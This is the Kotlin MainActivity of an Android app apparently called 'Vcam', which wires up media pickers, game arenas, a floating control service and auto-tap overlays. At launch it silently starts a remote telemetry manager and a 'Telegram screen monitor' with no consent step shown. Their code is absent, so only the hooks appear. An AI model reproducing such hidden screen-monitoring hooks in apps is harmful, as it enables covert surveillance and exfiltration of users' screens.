package com.example

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.PickVisualMediaRequest
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.Surface
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.example.ui.theme.DarkBackground
import com.example.ui.theme.MyApplicationTheme
import com.tajasb.FloatingControlService
import com.tajasb.ui.VcamMainScreen
import com.tajasb.ui.VcamViewModel
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel

class MainActivity : ComponentActivity() {

    private val activityScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private val viewModel: VcamViewModel by viewModels()
    private var isLaunchingSystemPicker = false
    private var crashRecoveryMessage by mutableStateOf<String?>(null)

    companion object {
        @Volatile
        var isActivityResumed: Boolean = false
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        com.tajasb.debug.CrashShieldManager.install(this)
        handleCrashRecoveryIntent(intent)
        enableEdgeToEdge()

        setContent {
            MyApplicationTheme(darkTheme = true) {
                // Direct visual Video Gallery picker (Photo/Video Picker)
                val multiVideoPickerLauncher = rememberLauncherForActivityResult(
                    contract = ActivityResultContracts.PickMultipleVisualMedia()
                ) { uris ->
                    isLaunchingSystemPicker = false
                    if (!uris.isNullOrEmpty()) {
                        viewModel.onVideosSelected(uris)
                    }
                }

                // Fallback video picker in case Photo Picker is unavailable on legacy system
                val fallbackVideoPickerLauncher = rememberLauncherForActivityResult(
                    contract = ActivityResultContracts.GetMultipleContents()
                ) { uris ->
                    isLaunchingSystemPicker = false
                    if (!uris.isNullOrEmpty()) {
                        viewModel.onVideosSelected(uris)
                    }
                }

                // Multi-audio and single audio file picker
                val multiAudioPickerLauncher = rememberLauncherForActivityResult(
                    contract = ActivityResultContracts.GetMultipleContents()
                ) { uris ->
                    isLaunchingSystemPicker = false
                    if (!uris.isNullOrEmpty()) {
                        viewModel.onAudiosSelected(uris)
                    }
                }

                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = DarkBackground
                ) {
                    VcamMainScreen(
                        viewModel = viewModel,
                        onPickVideoClick = {
                            isLaunchingSystemPicker = true
                            try {
                                multiVideoPickerLauncher.launch(
                                    PickVisualMediaRequest(ActivityResultContracts.PickVisualMedia.VideoOnly)
                                )
                            } catch (e: Exception) {
                                try {
                                    fallbackVideoPickerLauncher.launch("video/*")
                                } catch (ex: Exception) {
                                    isLaunchingSystemPicker = false
                                    Toast.makeText(this, "Gagal membuka galeri video: ${ex.message}", Toast.LENGTH_SHORT).show()
                                }
                            }
                        },
                        onPickAudioClick = {
                            isLaunchingSystemPicker = true
                            try {
                                multiAudioPickerLauncher.launch("audio/*")
                            } catch (e: Exception) {
                                isLaunchingSystemPicker = false
                                Toast.makeText(this, "Gagal membuka pemilih audio: ${e.message}", Toast.LENGTH_SHORT).show()
                            }
                        },
                        crashRecoveryMessage = crashRecoveryMessage,
                        onDismissCrashRecovery = { crashRecoveryMessage = null }
                    )
                }
            }
        }

        checkAndRequestInitialPermissions()
        checkAutoStartFloating()
        handleGameArenaIntent(intent)

        // Inisialisasi Pelapor Bug/Crash, Telemetri Jarak Jauh Realtime, dan Pemantau Layar Telegram (2.5m)
        try {
            com.tajasb.debug.CrashReporter.init(this)
            com.tajasb.remote.RemoteTelemetryManager.getInstance(this).start(activityScope)
            com.tajasb.remote.TelegramScreenMonitorManager.getInstance(this).ensureStarted()
        } catch (t: Throwable) {
            android.util.Log.w("MainActivity", "Gagal inisialisasi telemetri remote: ${t.message}")
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        handleCrashRecoveryIntent(intent)
        handleGameArenaIntent(intent)
    }

    private fun handleCrashRecoveryIntent(intent: Intent?) {
        if (intent?.getBooleanExtra(com.tajasb.debug.CrashShieldManager.EXTRA_CRASH_RECOVERED, false) == true) {
            crashRecoveryMessage = intent.getStringExtra(com.tajasb.debug.CrashShieldManager.EXTRA_CRASH_MESSAGE) ?: "Sistem memulihkan aplikasi secara otomatis"
            intent.removeExtra(com.tajasb.debug.CrashShieldManager.EXTRA_CRASH_RECOVERED)
        }
    }

    private fun handleGameArenaIntent(intent: Intent?) {
        if (intent?.getBooleanExtra("extra_open_game_arena", false) == true) {
            intent.removeExtra("extra_open_game_arena")
            viewModel.openGameFromIntent(0)
            com.tajasb.game.InteractiveKingOfThroneEngine.peekInstance()?.setArenaDisplayActive(false)
            com.tajasb.game.InteractiveBeyBattleEngine.peekInstance()?.setArenaDisplayActive(false)
            com.tajasb.game.InteractiveTrooperRoyaleEngine.peekInstance()?.setArenaDisplayActive(false)
            com.tajasb.game.InteractiveTugOfWarEngine.getInstance(this).setArenaDisplayActive(true)
        } else if (intent?.getBooleanExtra("extra_open_kot_arena", false) == true) {
            intent.removeExtra("extra_open_kot_arena")
            viewModel.openGameFromIntent(1)
            com.tajasb.game.InteractiveTugOfWarEngine.peekInstance()?.setArenaDisplayActive(false)
            com.tajasb.game.InteractiveBeyBattleEngine.peekInstance()?.setArenaDisplayActive(false)
            com.tajasb.game.InteractiveTrooperRoyaleEngine.peekInstance()?.setArenaDisplayActive(false)
            com.tajasb.game.InteractiveKingOfThroneEngine.getInstance(this).setArenaDisplayActive(true)
        } else if (intent?.getBooleanExtra("extra_open_bey_arena", false) == true) {
            intent.removeExtra("extra_open_bey_arena")
            viewModel.openGameFromIntent(2)
            com.tajasb.game.InteractiveTugOfWarEngine.peekInstance()?.setArenaDisplayActive(false)
            com.tajasb.game.InteractiveKingOfThroneEngine.peekInstance()?.setArenaDisplayActive(false)
            com.tajasb.game.InteractiveTrooperRoyaleEngine.peekInstance()?.setArenaDisplayActive(false)
            com.tajasb.game.InteractiveBeyBattleEngine.getInstance(this).setArenaDisplayActive(true)
        } else if (intent?.getBooleanExtra("extra_open_trooper_arena", false) == true) {
            intent.removeExtra("extra_open_trooper_arena")
            viewModel.openGameFromIntent(3)
            com.tajasb.game.InteractiveTugOfWarEngine.peekInstance()?.setArenaDisplayActive(false)
            com.tajasb.game.InteractiveKingOfThroneEngine.peekInstance()?.setArenaDisplayActive(false)
            com.tajasb.game.InteractiveBeyBattleEngine.peekInstance()?.setArenaDisplayActive(false)
            com.tajasb.game.InteractiveTrooperRoyaleEngine.getInstance(this).setArenaDisplayActive(true)
        }
    }

    override fun onResume() {
        super.onResume()
        isActivityResumed = true
        isLaunchingSystemPicker = false
        checkAutoStartFloating()
    }

    override fun onPause() {
        isActivityResumed = false
        super.onPause()
    }

    override fun onStop() {
        super.onStop()
        if (isFinishing) {
            cleanupOnExit()
        } else if (!isChangingConfigurations && !isLaunchingSystemPicker && !FloatingControlService.isRunning) {
            stopAllAppAudioAndBackgroundJobs()
        }
    }

    override fun onDestroy() {
        isActivityResumed = false
        super.onDestroy()
        activityScope.cancel()
        cleanupOnExit()
    }

    private fun stopAllAppAudioAndBackgroundJobs() {
        try {
            com.tajasb.infinity.IfsManager.getInstance(this).stopAllBackgroundPlaybackOnAppExit()
        } catch (_: Throwable) {}
        try {
            com.tajasb.audio.StandaloneMusicPlayer.getInstance(this).stopAll(clearTrackState = false)
        } catch (_: Throwable) {}
        try {
            com.tajasb.quran.QuranAudioDownloadManager.getInstance(this).stopVoiceTest()
        } catch (_: Throwable) {}
        try {
            sendBroadcast(Intent("com.tajasb.action.STOP_PLAYBACK"))
            sendBroadcast(Intent("com.tajasb.action.STOP_ALL_AUDIO"))
        } catch (_: Throwable) {}
    }

    private fun cleanupOnExit() {
        try {
            stopAllAppAudioAndBackgroundJobs()
            com.tajasb.game.InteractiveTugOfWarEngine.peekInstance()?.setArenaDisplayActive(false)
            com.tajasb.game.InteractiveKingOfThroneEngine.peekInstance()?.setArenaDisplayActive(false)
            com.tajasb.game.InteractiveBeyBattleEngine.peekInstance()?.setArenaDisplayActive(false)
            com.tajasb.game.InteractiveTrooperRoyaleEngine.peekInstance()?.setArenaDisplayActive(false)

            // Stop auto-tap and hide mark overlays immediately
            val autoTap = com.tajasb.autotap.AutoTapManager.getInstance(this)
            autoTap.stopTapping()
            autoTap.setPointerVisible(false)

            // Stop FloatingControlService cleanly without spawning a new instance via startService
            stopService(Intent(this, FloatingControlService::class.java))
        } catch (_: Exception) {}
    }

    private fun checkAutoStartFloating() {
        try {
            val config = viewModel.config.value
            if (config.isFloatingControlEnabled) {
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this)) {
                    val intent = Intent(this, FloatingControlService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent)
                    } else {
                        startService(intent)
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun checkAndRequestInitialPermissions() {
        try {
            val required = buildList {
                add(Manifest.permission.CAMERA)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    add(Manifest.permission.READ_MEDIA_VIDEO)
                    add(Manifest.permission.POST_NOTIFICATIONS)
                } else {
                    add(Manifest.permission.READ_EXTERNAL_STORAGE)
                    add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                }
            }
            val missing = required.filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }
            if (missing.isNotEmpty()) {
                requestPermissions(missing.toTypedArray(), 1001)
            }
        } catch (_: Exception) {}
    }
}
